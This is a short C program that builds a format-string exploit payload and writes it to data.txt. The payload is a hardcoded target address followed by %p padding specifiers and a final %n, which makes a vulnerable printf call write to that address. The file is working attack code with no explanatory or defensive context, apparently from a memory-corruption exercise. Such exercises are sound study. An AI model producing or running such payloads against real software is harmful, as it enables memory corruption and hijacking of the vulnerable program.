#include <stdio.h>

int main (int argc, const char * argv[]) {
	void * ptr = (void *)0x0804a02b;
	const char * ptrData = (const char *)&ptr;
	FILE * fp = fopen("data.txt", "w");
	int i;
	fwrite(ptrData, 1, 4, fp);
	fprintf(fp, "%%256p%%256p%%256p%%256p%%8p%%p%%p%%p%%p%%p%%n");
	fprintf(fp, "\n");
	fclose(fp);
}
